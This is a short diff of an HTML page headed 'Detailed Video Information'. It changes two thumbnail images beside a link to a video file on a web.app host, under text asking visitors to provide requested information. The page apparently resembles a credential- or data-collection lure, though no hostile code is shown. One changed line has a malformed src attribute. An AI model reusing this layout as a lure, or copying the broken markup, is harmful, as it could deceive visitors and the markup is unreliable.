@@ -62,7 +62,7 @@
         Detailed Video Information
       </b>
     </div><div>
-      <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img class="w-32 h-20 mx-3" src="download.jfif" alt=""></a>
+      <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img class="w-32 h-20 mx-3" src="download"png" alt=""></a>
     </div><p class="text-[10px] font-serif  mt-3 mx-3">
       Please be sure to provide the requested information below.
     </p><div><p class="text-sm text-gray-400 mx-5">
@@ -159,7 +159,7 @@
   </p>
 </div>
 <div>
-  <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img src="./download.jfif" alt=""></a>
+  <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img src="./download.png" alt=""></a>
 </div><div>
   <p class=" pl-3 text-[12px] font-semibold">
     Please be sure to provide the requested information below.
